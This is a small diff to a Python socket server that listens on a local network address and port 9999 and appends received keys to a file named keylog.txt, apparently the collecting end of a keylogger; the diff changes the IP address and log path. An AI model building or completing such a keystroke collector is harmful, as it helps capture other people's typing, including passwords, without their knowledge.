@@ -1,7 +1,7 @@
 # This Python file uses the following encoding: utf-8
 import socket
 
-host = '192.168.1.11'
+host = '192.168.1.110'# Connect  main.py & My Ipaddress Computer
 port = 9999
 
 s = socket.socket()
@@ -9,7 +9,7 @@ s.bind((host, port))
 s.listen(2)
 
 def file_write(keys):
-    with open("/home/hmei7/Documents/key/keylog.txt","a") as file:
+    with open("/home/username/keylog.txt","a") as file:
         for key in keys:
             file.write(key)
 
